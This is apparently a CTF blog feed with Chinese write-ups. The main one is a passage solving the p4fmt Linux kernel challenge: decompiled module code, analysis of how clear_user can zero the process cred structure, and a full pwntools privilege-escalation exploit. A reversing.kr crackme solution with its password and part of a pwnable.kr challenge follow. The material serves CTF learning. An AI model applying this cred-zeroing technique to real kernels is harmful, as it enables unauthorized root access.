class="line">*(_DWORD *)(v6 + <span class="number">0x80</span>) = <span class="number">0x800000</span>;</span><br><span class="line">setup_new_exec(v4); <span class="comment">//</span></span><br><span class="line">v12 = *(_BYTE *)(v4 + <span class="number">75</span>); \\ <span class="number">0x4b</span> == <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-22</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(v4 + <span class="number">76</span>) ) </span><br><span class="line">      &#123;<span class="comment">//  v3 = a1 + 0x48;</span></span><br><span class="line">        v16 = (__int64 *)(*(_QWORD *)(v4 + <span class="number">80</span>) + v3); <span class="comment">//  0x50 是一个偏移，</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v17 = *v16;  <span class="comment">// v16 指向一个信息chunk</span></span><br><span class="line">          v18 = *v16 &amp; <span class="number">7</span>;</span><br><span class="line">          v19 = *v16 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL;       <span class="comment">// load_addr </span></span><br><span class="line">          printk(<span class="string">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n"</span>, v19, v16[<span class="number">1</span>], v16[<span class="number">2</span>], v18);</span><br><span class="line">          v20 = v16[<span class="number">2</span>];</span><br><span class="line">          v21 = v16[<span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> ( v17 &amp; <span class="number">8</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            vm_mmap(<span class="number">0L</span>L, v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">            printk(<span class="string">"clear_user(addr=0x%llx, length=0x%llx)\n"</span>, *v16, v16[<span class="number">1</span>], v22, v23);</span><br><span class="line">            _clear_user(*v16, v16[<span class="number">1</span>]); </span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            vm_mmap(*(_QWORD *)(v4 + <span class="number">8</span>), v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v10;</span><br><span class="line">          v16 += <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( *(_DWORD *)(v4 + <span class="number">76</span>) &gt; v10 );  <span class="comment">// do while v10初始值为0 所以 0x4c应该就是一个数量，然后vm_mmap 空间</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                                            <span class="comment">// 0x4b = 0</span></span><br><span class="line">    &#123; </span><br><span class="line">      v13 = <span class="number">-12L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)vm_mmap(</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">8</span>),</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">80</span>),</span><br><span class="line">                               <span class="number">4096L</span>L,</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">80</span>) &amp; <span class="number">7L</span>L,</span><br><span class="line">                               <span class="number">2L</span>L,</span><br><span class="line">                               <span class="number">0L</span>L) &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">        install_exec_creds(v4); <span class="comment">//为新进程安装用户凭证</span></span><br><span class="line">        set_binfmt(&amp;p4format); <span class="comment">//应该就是注册一个格式在这个新的进程内</span></span><br><span class="line">        v14 = <span class="number">0x7FFFFFFFF000</span>LL;</span><br><span class="line">        v15 = __readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task);</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)v15 &amp; <span class="number">0x20000000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = <span class="number">3221225472L</span>L;</span><br><span class="line">          <span class="keyword">if</span> ( !(*(_BYTE *)(v15 + <span class="number">131</span>) &amp; <span class="number">8</span>) )</span><br><span class="line">            v14 = <span class="number">4294959104L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = setup_arg_pages(v4, v14, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">if</span> ( !v10 )</span><br><span class="line">        &#123;</span><br><span class="line">          finalize_exec(v4);</span><br><span class="line">          start_thread( </span><br><span class="line">            v9 + <span class="number">16216</span>,</span><br><span class="line">            v13,</span><br><span class="line">            *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">256</span>) + <span class="number">40L</span>L));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = *(_QWORD *)(v4 + <span class="number">0x58</span>); <span class="comment">// entry</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>setup_new_exec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup_new_exec()来初始化它的状态，它会检查新程序是否可以生成core dump文件或者是否能通过ptrace attach到新进程，对于标记了setuid和setgid的程序默认是不会生成core dump文件，如果当前用户凭证没有权限读取可执行文件时也不会生成core dump文件</span><br></pre></td></tr></table></figure><p>start_thread</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void start_thread(struct pt_regs *regs, unsigned long new_ip, unsigned long new_sp)</span><br></pre></td></tr></table></figure><p>所以 v13应该是entry<br>所以这个文件的格式就很明确了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P4\x00 version type count offset entry struct(chunk)</span><br></pre></td></tr></table></figure><p>程序的流程大概清晰。<br>然后在发现<code>install_exec_creds</code> 这个函数会调用 comimit_cred</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">install_exec_creds</span><span class="params">(struct linux_binprm *bprm)</span> <span class="comment">//bprm 可以控制</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">security_bprm_committing_creds(bprm);</span><br><span class="line"></span><br><span class="line">commit_creds(bprm-&gt;cred);</span><br><span class="line">bprm-&gt;cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Disable monitoring for regular users</span></span><br><span class="line"><span class="comment"> * when executing setuid binaries. Must</span></span><br><span class="line"><span class="comment"> * wait until new credentials are committed</span></span><br><span class="line"><span class="comment"> * by commit_creds() above</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (get_dumpable(current-&gt;mm) != SUID_DUMP_USER)</span><br><span class="line">perf_event_exit_task(current);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cred_guard_mutex must be held at least to this point to prevent</span></span><br><span class="line"><span class="comment"> * ptrace_attach() from altering our determination of the task's</span></span><br><span class="line"><span class="comment"> * credentials; any time after this it may be unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">security_bprm_committed_creds(bprm);</span><br><span class="line">mutex_unlock(&amp;current-&gt;signal-&gt;cred_guard_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们能控制bprm-cred，然后清零。<br>就能成功提取了<br>想到 前面的offset可以控制，那是不是说明 load_addr 可以控制？<br>clear_user — Zero a block of memory in user space.<br><code>_clear_user(*v16, v16[1]);</code> v16很明显可以控制，那就是说通过offset指到 cred那，然后清零就能成功提权了</p><p>接下来就开始Debug</p><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>先提取出 <code>vmlinux</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z2x initramfs.cpio.gz</span><br></pre></td></tr></table></figure><p>再修改run.sh 使得gdb 可以连上去<br>现在先测试下刚刚得出来的 文件格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">       │ File: exp.py</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">1</span>   │ <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">   <span class="number">2</span>   │ </span><br><span class="line">   <span class="number">3</span>   │ payload  = <span class="string">"P4\x00"</span></span><br><span class="line">   <span class="number">4</span>   │ payload += <span class="string">"\x01"</span></span><br><span class="line">   <span class="number">5</span>   │ payload += p32(<span class="number">1</span>)</span><br><span class="line">   <span class="number">6</span>   │ payload += p64(<span class="number">0x90</span>)</span><br><span class="line">   <span class="number">7</span>   │ payload += p64(<span class="number">0</span>)</span><br><span class="line">   <span class="number">8</span>   │ payload += <span class="string">"Ordin"</span></span><br><span class="line">   <span class="number">9</span>   │ <span class="keyword">print</span> payload.encode(<span class="string">'base64'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[  160.994444] vm_mmap(load_addr=0x0, length=0xffff8880071fe3c0, offset=0x0, prot=0)</span><br><span class="line">[  161.008003] Ordin[531]: segfault at 0 ip 0000000000000000 sp 00007fffffffefaa error 14</span><br><span class="line">[  161.015835] Code: Bad RIP value.</span><br></pre></td></tr></table></figure><p>发现是成功的<br>然后再去寻找cred的偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/modules </span><br><span class="line">p4fmt 16384 0 - Live 0xffffffffc0000000 (O)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; add-symbol-file ./p4fmt.ko 0xffffffffc0000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt;  b *0xffffffffc00000af</span><br><span class="line"></span><br><span class="line"> ► 0xffffffff81189ec0    push   rbx</span><br><span class="line">   0xffffffff81189ec1    mov    rbx, rdi</span><br><span class="line">   0xffffffff81189ec4    call   0xffffffff81297aa0</span><br><span class="line"> </span><br><span class="line">   0xffffffff81189ec9    mov    rdi, qword ptr [rbx + 0xe0]</span><br><span class="line">   0xffffffff81189ed0    call   0xffffffff81073d30</span><br><span class="line"></span><br><span class="line">两个call  再对比下源码</span><br><span class="line">可以知道是第二个call</span><br><span class="line">void install_exec_creds(struct linux_binprm *bprm)</span><br><span class="line">&#123;</span><br><span class="line">security_bprm_committing_creds(bprm);</span><br><span class="line"></span><br><span class="line">commit_creds(bprm-&gt;cred);</span><br><span class="line">rdi 是传入的参数 可以知道 cred的偏移是0xe0</span><br><span class="line">然后因为传进去的是 v4</span><br><span class="line"></span><br><span class="line">所以 cred的距离文件头P4的偏移是 0xe0-0x48 = 0x98</span><br></pre></td></tr></table></figure><p>在调试的过程中，我发现其实成功提权的机率不算特别高。看运气的啦<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch = <span class="string">'amd64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(addr)</span>:</span></span><br><span class="line">    </span><br><span class="line">    payload  = <span class="string">"P4"</span></span><br><span class="line">    payload +=p8(<span class="number">0</span>)</span><br><span class="line">    payload += <span class="string">"\x01"</span></span><br><span class="line">    payload += p32(<span class="number">2</span>)</span><br><span class="line">    payload += p64(<span class="number">0x18</span>)</span><br><span class="line">    payload += p64(<span class="number">0x400048</span>)</span><br><span class="line">    payload += p64(<span class="number">0x400000</span>|<span class="number">7</span>)</span><br><span class="line">    payload += p64(<span class="number">0x1000</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64((addr|<span class="number">8</span>)+<span class="number">0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0x48</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#payload += asm(shellcraft.cat('/flag')+shellcraft.exit())</span></span><br><span class="line">    <span class="keyword">return</span> payload.encode(<span class="string">'base64'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./run.sh'</span>)</span><br><span class="line"><span class="comment">#UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAT3JkaW4=</span></span><br><span class="line">p.sendlineafter(<span class="string">"/ $"</span>,<span class="string">"echo -n 'UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAT3JkaW4=' | base64 -d &gt; ./tmp/Ordin"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"/ $"</span>,<span class="string">"chmod +x ./tmp/Ordin &amp;&amp; ./tmp/Ordin"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length='</span>)</span><br><span class="line">addr = int(p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line">payload = pwn(addr)</span><br><span class="line">cmd = <span class="string">"echo -n '%s' | base64 -d &gt; /tmp/Ordin1 ;chmod +x /tmp/Ordin1"</span> % payload</span><br><span class="line">p.sendlineafter(<span class="string">"/ $"</span>,cmd)</span><br><span class="line">p.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.sendline(<span class="string">'/tmp/Ordin1'</span>)</span><br><span class="line">    mm = p.recvuntil(<span class="string">'/ '</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"FLAG"</span> <span class="keyword">in</span> mm <span class="keyword">or</span> <span class="string">"flag"</span> <span class="keyword">in</span> mm :</span><br><span class="line">        log.info(<span class="string">"success"</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">    ans = p.recvuntil(<span class="string">"&gt;"</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    log.info(ans)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="https://xz.aliyun.com/t/4574" target="_blank" rel="noopener">Kirin </a><br><a href="https://github.com/OAlienO/OAlienO/blob/705fd61f73703eba65732abcf87cfdbf2644108a/docs/security/pwn/writeups/p4fmt.md" target="_blank" rel="noopener">OAlienO</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy_crack</title>
      <link href="/2019/07/23/%C2%96%C2%96reversing-kr-Easy-crack/"/>
      <url>/2019/07/23/%C2%96%C2%96reversing-kr-Easy-crack/</url>
      
        <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><p><img src="https://raw.githubusercontent.com/leave-Devour/leave-Devour.github.io/master/images/20190723214824.png" alt></p><p><code>猜想</code>：会不会是单纯的一个一个的字符的验证呢？</p><p>放进Ollydbg</p><p><code>查找</code>关键字</p><p><img src="https://raw.githubusercontent.com/leave-Devour/leave-Devour.github.io/master/images/20190723215545.png" alt></p><p>看到congratulation，果断跟进去，断在入口处，这题就ok啦；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">00401080  /$  83EC 64       sub esp,0x64</span><br><span class="line">00401083  |.  57            push edi</span><br><span class="line">00401084  |.  B9 18000000   mov ecx,0x18</span><br><span class="line">00401089  |.  33C0          xor eax,eax</span><br><span class="line">0040108B  |.  8D7C24 05     lea edi,dword ptr ss:[esp+0x5]</span><br><span class="line">0040108F  |.  C64424 04 00  mov byte ptr ss:[esp+0x4],0x0</span><br><span class="line">00401094  |.  6A 64         push 0x64                                ; /Count = 64 (100.)</span><br><span class="line">00401096  |.  F3:AB         rep stos dword ptr es:[edi]              ; |</span><br><span class="line">00401098  |.  66:AB         stos word ptr es:[edi]                   ; |</span><br><span class="line">0040109A  |.  AA            stos byte ptr es:[edi]                   ; |</span><br><span class="line">0040109B  |.  8B7C24 70     mov edi,dword ptr ss:[esp+0x70]          ; |user32.76DC635B</span><br><span class="line">0040109F  |.  8D4424 08     lea eax,dword ptr ss:[esp+0x8]           ; |</span><br><span class="line">004010A3  |.  50            push eax                                 ; |Buffer = 00000001</span><br><span class="line">004010A4  |.  68 E8030000   push 0x3E8                               ; |ControlID = 3E8 (1000.)</span><br><span class="line">004010A9  |.  57            push edi                                 ; |hWnd = 01230BE2 (&apos;Easy CrackMe&apos;,class=&apos;#32770&apos;)</span><br><span class="line">004010AA  |.  FF15 9C504000 call dword ptr ds:[&lt;&amp;USER32.GetDlgItemTe&gt;; \GetDlgItemTextA</span><br><span class="line">004010B0  |.  807C24 05 61  cmp byte ptr ss:[esp+0x5],0x61           ;  第二個字符</span><br><span class="line">004010B5  |.  75 7E         jnz short Easy_Cra.00401135</span><br><span class="line">004010B7  |.  6A 02         push 0x2</span><br><span class="line">004010B9  |.  8D4C24 0A     lea ecx,dword ptr ss:[esp+0xA]</span><br><span class="line">004010BD  |.  68 78604000   push Easy_Cra.00406078                   ;  5y</span><br><span class="line">004010C2  |.  51            push ecx</span><br><span class="line">004010C3  |.  E8 88000000   call Easy_Cra.00401150                   ;  第三 第四字符</span><br><span class="line">004010C8  |.  83C4 0C       add esp,0xC</span><br><span class="line">004010CB  |.  85C0          test eax,eax</span><br><span class="line">004010CD  |.  75 66         jnz short Easy_Cra.00401135</span><br><span class="line">004010CF  |.  53            push ebx</span><br><span class="line">004010D0  |.  56            push esi</span><br><span class="line">004010D1  |.  BE 6C604000   mov esi,Easy_Cra.0040606C                ;  R3versing</span><br><span class="line">004010D6  |.  8D4424 10     lea eax,dword ptr ss:[esp+0x10]</span><br><span class="line">004010DA  |&gt;  8A10          /mov dl,byte ptr ds:[eax]                ;  這裡判斷第五個字符到最後</span><br><span class="line">004010DC  |.  8A1E          |mov bl,byte ptr ds:[esi]</span><br><span class="line">004010DE  |.  8ACA          |mov cl,dl</span><br><span class="line">004010E0  |.  3AD3          |cmp dl,bl</span><br><span class="line">004010E2  |.  75 1E         |jnz short Easy_Cra.00401102</span><br><span class="line">004010E4  |.  84C9          |test cl,cl</span><br><span class="line">004010E6  |.  74 16         |je short Easy_Cra.004010FE</span><br><span class="line">004010E8  |.  8A50 01       |mov dl,byte ptr ds:[eax+0x1]</span><br><span class="line">004010EB  |.  8A5E 01       |mov bl,byte ptr ds:[esi+0x1]</span><br><span class="line">004010EE  |.  8ACA          |mov cl,dl</span><br><span class="line">004010F0  |.  3AD3          |cmp dl,bl</span><br><span class="line">004010F2  |.  75 0E         |jnz short Easy_Cra.00401102</span><br><span class="line">004010F4  |.  83C0 02       |add eax,0x2</span><br><span class="line">004010F7  |.  83C6 02       |add esi,0x2</span><br><span class="line">004010FA  |.  84C9          |test cl,cl</span><br><span class="line">004010FC  |.^ 75 DC         \jnz short Easy_Cra.004010DA</span><br><span class="line">004010FE  |&gt;  33C0          xor eax,eax</span><br><span class="line">00401100  |.  EB 05         jmp short Easy_Cra.00401107</span><br><span class="line">00401102  |&gt;  1BC0          sbb eax,eax</span><br><span class="line">00401104  |.  83D8 FF       sbb eax,-0x1</span><br><span class="line">00401107  |&gt;  5E            pop esi</span><br><span class="line">00401108  |.  5B            pop ebx</span><br><span class="line">00401109  |.  85C0          test eax,eax</span><br><span class="line">0040110B  |.  75 28         jnz short Easy_Cra.00401135</span><br><span class="line">0040110D  |.  807C24 04 45  cmp byte ptr ss:[esp+0x4],0x45           ;  第一個字符</span><br><span class="line">00401112  |.  75 21         jnz short Easy_Cra.00401135</span><br><span class="line">00401114  |.  6A 40         push 0x40                                ; /Style = MB_OK|MB_ICONASTERISK|MB_APPLMODAL</span><br><span class="line">00401116  |.  68 58604000   push Easy_Cra.00406058                   ; |EasyCrackMe</span><br><span class="line">0040111B  |.  68 44604000   push Easy_Cra.00406044                   ; |Congratulation !!</span><br><span class="line">00401120  |.  57            push edi                                 ; |hOwner = 01230BE2 (&apos;Easy CrackMe&apos;,class=&apos;#32770&apos;)</span><br><span class="line">00401121  |.  FF15 A0504000 call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;&gt;; \MessageBoxA</span><br><span class="line">00401127  |.  6A 00         push 0x0                                 ; /Result = 0x0</span><br><span class="line">00401129  |.  57            push edi                                 ; |hWnd = 01230BE2 (&apos;Easy CrackMe&apos;,class=&apos;#32770&apos;)</span><br><span class="line">0040112A  |.  FF15 A4504000 call dword ptr ds:[&lt;&amp;USER32.EndDialog&gt;]  ; \EndDialog</span><br><span class="line">00401130  |.  5F            pop edi</span><br><span class="line">00401131  |.  83C4 64       add esp,0x64</span><br><span class="line">00401134  |.  C3            retn</span><br><span class="line">00401135  |&gt;  6A 10         push 0x10                                ; /Style = MB_OK|MB_ICONHAND|MB_APPLMODAL</span><br><span class="line">00401137  |.  68 58604000   push Easy_Cra.00406058                   ; |EasyCrackMe</span><br><span class="line">0040113C  |.  68 30604000   push Easy_Cra.00406030                   ; |Incorrect Password</span><br><span class="line">00401141  |.  57            push edi                                 ; |hOwner = 01230BE2 (&apos;Easy CrackMe&apos;,class=&apos;#32770&apos;)</span><br><span class="line">00401142  |.  FF15 A0504000 call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;&gt;; \MessageBoxA</span><br><span class="line">00401148  |.  5F            pop edi</span><br><span class="line">00401149  |.  83C4 64       add esp,0x64</span><br><span class="line">0040114C  \.  C3            retn</span><br></pre></td></tr></table></figure><p>最后得出的password就是：<code>Ea5yR3versing</code></p>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reversing.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>input</title>
      <link href="/2019/07/23/Pwnable-kr-input/"/>
      <url>/2019/07/23/Pwnable-kr-input/</url>
      
        <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//argc</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span 